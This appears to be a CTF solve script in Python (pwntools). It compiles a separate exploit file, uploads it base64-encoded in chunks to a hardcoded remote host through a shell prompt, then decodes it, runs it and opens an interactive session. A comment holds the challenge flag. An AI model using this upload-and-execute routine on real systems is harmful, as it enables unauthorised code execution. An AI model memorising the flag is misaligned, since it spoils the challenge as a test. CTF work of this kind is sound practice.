#!/usr/bin/env python3
from pwn import *
import base64 , os

# rwctf{OhhohohO_yoU_Got_mE}

os.system( 'musl-gcc exp.c -o exp -static -s -masm=intel' )
os.system( 'gzip exp -f' )

y = remote( '13.52.35.2' , 10918 ) 
#y = process( './run.sh' )

b = open( 'exp.gz' , 'rb' ).read()
b = base64.b64encode(b)
l = 800

upload = log.progress('Uploading exp ...')
for i in range( 0 , len( b ) , l ):
    upload.status( f'{i/float(len(b)) : .2%}' )
    y.sendlineafter( '# ' , 'echo -n %s >> exp.gz.b64' % b[i:i+l].decode() )
    #p = 'printf \'\\%s\' >> ./exp' % '\\'.join( oct( _ )[1:].rjust( 3 ,'0' ) for _ in b[ i : i + l ] )

upload.success('Done!')

y.sendlineafter( '# ' , 'cat /exp.gz.b64 | base64 -d > /exp.gz' )
y.sendlineafter( '# ' , 'gzip -d /exp.gz' )
y.sendlineafter( '# ' , 'chmod +x ./exp' )
y.sendlineafter( '# ' , '/exp' )

y.interactive()